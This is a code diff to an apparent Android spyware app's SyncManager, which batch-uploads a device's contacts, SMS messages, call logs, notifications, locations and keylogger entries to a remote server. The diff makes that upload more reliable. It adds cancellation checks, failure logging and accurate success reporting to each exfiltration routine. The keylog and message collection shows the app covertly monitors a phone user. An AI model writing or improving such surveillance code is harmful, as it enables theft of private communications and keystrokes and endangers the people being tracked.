@@ -31,6 +31,7 @@ object SyncManager {
     private lateinit var database: AbuZahraDatabase
     private lateinit var appContext: Context
     private val syncScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private var syncJob: kotlinx.coroutines.Job? = null
     
     // Sync state
     private val isSyncing = AtomicBoolean(false)
@@ -111,6 +112,10 @@ object SyncManager {
             val pendingQueue = database.syncQueueDao().getPendingBatch(BATCH_SIZE)
             
             pendingQueue.forEachIndexed { index, item ->
+                if (!isSyncing.get()) {
+                    Log.i(TAG, "Sync cancelled by user")
+                    return@forEachIndexed
+                }
                 _syncState.value = SyncState.Syncing(pendingQueue.size - index, item.syncType)
                 
                 val result = processSyncItem(item)
@@ -126,6 +131,10 @@ object SyncManager {
             // Process failed items for retry
             val retryableItems = database.syncQueueDao().getRetryable()
             retryableItems.forEach { item ->
+                if (!isSyncing.get()) {
+                    Log.i(TAG, "Sync cancelled by user (retry)")
+                    return@forEach
+                }
                 if (item.retryCount < item.maxRetries) {
                     val result = processSyncItem(item)
                     if (result) {
@@ -191,6 +200,7 @@ object SyncManager {
         val contacts = database.contactDao().getUnsynced()
         if (contacts.isEmpty()) return true
         
+        var allSuccess = true
         contacts.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { contact ->
@@ -205,10 +215,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "contacts", jsonArray.toString())
             if (response) {
                 database.contactDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync contacts batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -218,6 +231,7 @@ object SyncManager {
         val messages = database.smsDao().getUnsynced()
         if (messages.isEmpty()) return true
         
+        var allSuccess = true
         messages.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { sms ->
@@ -233,10 +247,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "sms", jsonArray.toString())
             if (response) {
                 database.smsDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync SMS batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -246,6 +263,7 @@ object SyncManager {
         val calls = database.callDao().getUnsynced()
         if (calls.isEmpty()) return true
         
+        var allSuccess = true
         calls.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { call ->
@@ -261,10 +279,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "calls", jsonArray.toString())
             if (response) {
                 database.callDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync calls batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -274,6 +295,7 @@ object SyncManager {
         val notifications = database.notificationDao().getUnsynced()
         if (notifications.isEmpty()) return true
         
+        var allSuccess = true
         notifications.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { notif ->
@@ -288,10 +310,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "notifications", jsonArray.toString())
             if (response) {
                 database.notificationDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync notifications batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -301,6 +326,7 @@ object SyncManager {
         val locations = database.locationDao().getUnsynced()
         if (locations.isEmpty()) return true
         
+        var allSuccess = true
         locations.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { loc ->
@@ -316,10 +342,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "location", jsonArray.toString())
             if (response) {
                 database.locationDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync location batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -329,6 +358,7 @@ object SyncManager {
         val entries = database.keylogDao().getUnsynced()
         if (entries.isEmpty()) return true
         
+        var allSuccess = true
         entries.chunked(BATCH_SIZE).forEach { batch ->
             val jsonArray = org.json.JSONArray()
             batch.forEach { entry ->
@@ -342,10 +372,13 @@ object SyncManager {
             val response = ApiClient.sendData(appContext, "keylog", jsonArray.toString())
             if (response) {
                 database.keylogDao().markSynced(batch.map { it.id })
+            } else {
+                Log.w(TAG, "Failed to sync keylog batch to server")
+                allSuccess = false
             }
         }
         
-        return true
+        return allSuccess
     }
     
     /**
@@ -491,6 +524,8 @@ object SyncManager {
     fun cancelSync() {
         isSyncing.set(false)
         _syncState.value = SyncState.Idle
+        syncJob?.cancel()
+        syncJob = null
     }
     
     // Data classes
